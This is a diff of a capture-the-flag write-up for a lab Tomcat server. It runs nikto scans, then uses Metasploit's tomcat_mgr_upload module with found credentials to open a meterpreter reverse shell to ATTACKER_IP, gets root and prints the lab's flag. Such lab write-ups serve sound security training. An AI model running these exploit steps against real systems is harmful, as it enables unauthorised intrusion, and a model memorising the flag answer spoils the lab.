@@ -140,6 +140,7 @@ There are **5** `documentation` files.
 #### Part B: What is the server version?
 
 Use `nikto` on port `80` with no extra path or credentials.
+
 ```bash
 nikto -h http://TARGET_IP:80                          
 - Nikto v2.1.5
@@ -160,11 +161,13 @@ nikto -h http://TARGET_IP:80
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
+
 The server version is **Apache/2.4.18**.
 
 #### Part C: What version of Apache-Coyote is this service using?
 
 Use `nikto` on port `1234` with path `/manager/html` under `Bob`'s credentials.
+
 ```bash
 nikto -h http://TARGET_IP:1234/manager/html -id bob:bubbles
 - Nikto v2.1.5
@@ -191,11 +194,13 @@ nikto -h http://TARGET_IP:1234/manager/html -id bob:bubbles
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
-The Apache-Coyote version running on this service is **1.1**.
+
+The `Apache-Coyote` version running on this service is **1.1**.
 
 ### Question 8: Use Metasploit to exploit the service and get a shell on the system.
 
-Initiate the `Metasploit` session with `msfconsole` and use `search` to find potential Apache Tomcat Manager exploits.
+Initiate the `Metasploit` session with `msfconsole` and use `search` to find potential `Apache Tomcat Manager` exploits.
+
 ```bash
 msf > search tomcat mgr
 
@@ -215,14 +220,27 @@ Matching Modules
    8    \_ target: Linux x86                   .                .          .      .
    9  auxiliary/scanner/http/tomcat_mgr_login  .                normal     No     Tomcat Application Manager Login Utility
 ```
+
 For this task choose `exploit/multi/http/tomcat_mgr_upload`, `set` the parameters accordingly, then `run`.
+
 ```bash
 msf > use exploit/multi/http/tomcat_mgr_upload
+
 msf exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
+HttpPassword => bubbles
+
 msf exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
+HttpUsername => bob
+
 msf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS TARGET_IP
+RHOSTS => TARGET_IP
+
 msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
+RPORT => 1234
+
 msf exploit(multi/http/tomcat_mgr_upload) > set LHOST ATTACKER_IP
+LHOST => ATTACKER_IP
+
 msf exploit(multi/http/tomcat_mgr_upload) > show options
 
 Module options (exploit/multi/http/tomcat_mgr_upload):
@@ -242,7 +260,6 @@ Module options (exploit/multi/http/tomcat_mgr_upload):
                                             loy will be used)
    VHOST                          no        HTTP server virtual host
 
-
 Payload options (java/meterpreter/reverse_tcp):
 
    Name   Current Setting  Required  Description
@@ -250,22 +267,21 @@ Payload options (java/meterpreter/reverse_tcp):
    LHOST  ATTACKER_IP      yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   Java Universal
 
-
-
 View the full module info with the info, or info -d command.
+
 msf exploit(multi/http/tomcat_mgr_upload) > run
 ```
 
 #### Part A: What user did you get a shell as?
 
 Use `shell` to query the user identity.
+
 ```bash
 meterpreter > shell
 Process 1 created.
@@ -273,14 +289,17 @@ Channel 2 created.
 whoami
 root
 ```
+
 The user is **root**.
 
 #### Part B: What flag is found in the root directory?
 
 This can be done inside or outside of the `shell`.
+
 ```bash
 meterpreter > cat /root/flag.txt
 ff1fc4a81affcc7688cf89ae7dc6e0e1
 ```
+
 The recovered flag is **ff1fc4a81affcc7688cf89ae7dc6e0e1**.
 
